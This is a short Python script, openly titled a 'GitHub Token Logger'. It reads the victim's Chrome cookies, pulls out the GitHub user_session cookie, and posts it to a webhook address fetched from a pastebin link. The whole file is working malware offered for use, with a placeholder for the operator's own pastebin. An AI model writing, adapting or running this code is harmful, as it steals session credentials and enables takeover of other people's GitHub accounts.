import browser_cookie3
import requests

# Enter your pastebin below
pastebinURL = "https://pastebin.com/raw/W3CUUpQX"

webhook = requests.get(url=pastebinURL).text
browserCookieList = browser_cookie3.chrome()
stringCookieList = str(browserCookieList)
splitted = stringCookieList.split(", ")
for line in splitted:
	if 'user_session=' in line:
		finalCookie = line.split(" ")
		global githubCookie
		githubCookie = finalCookie[1]

req = requests.post(url=webhook, data={"username": "GitHub Token Logger | github.com/localsgithub", "content": f"Logged Cookie:\n```{githubCookie}```"})
print(req.text)
